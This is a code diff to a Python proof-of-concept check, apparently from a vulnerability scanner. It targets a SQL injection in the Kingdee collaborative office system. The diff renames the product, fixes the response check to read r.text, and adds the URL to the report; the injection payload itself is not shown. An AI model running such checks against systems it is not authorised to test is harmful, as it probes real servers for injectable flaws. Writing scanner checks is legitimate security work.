@@ -5,17 +5,17 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
 class Vuln(ABVuln):
     vuln_id = 'Kingdee_0001' # 平台漏洞编号，留空
-    name = '金蝶协作办公系统 SQL注入'  # 漏洞名称
+    name = '金蝶协同办公系统 SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
     type = VulnType.INJECTION # 漏洞类型
     disclosure_date = '2015-08-26'  # 漏洞公布时间
     desc = '''
-        金蝶协作办公系统文件参数过滤不严谨，造成SQL注入漏洞。
+        金蝶协同办公系统文件参数过滤不严谨，造成SQL注入漏洞。
     '''  # 漏洞描述
     ref = 'Unkonwn'  # 漏洞来源
     cnvd_id = 'Unkonwn'  # cnvd漏洞编号
     cve_id = 'Unkonwn'  # cve编号
-    product = '金蝶协作办公系统'  # 漏洞应用名称
+    product = '金蝶协同办公系统'  # 漏洞应用名称
     product_version = 'Unkonwn'  # 漏洞应用版本
 
 class Poc(ABPoc):
@@ -46,9 +46,9 @@ class Poc(ABPoc):
                 verify_url = self.target + payload
                 r = requests.get(verify_url)
 
-                if r.status_code == 200 and '81dc9bdb52d04dc20036dbd8313ed055' in res:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                if r.status_code == 200 and '81dc9bdb52d04dc20036dbd8313ed055' in r.text:
+                    self.output.report(self.vuln, '发现{target}存在{name}漏洞;url{url}'.format(
+                        target=self.target, name=self.vuln.name, url=verify_url))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
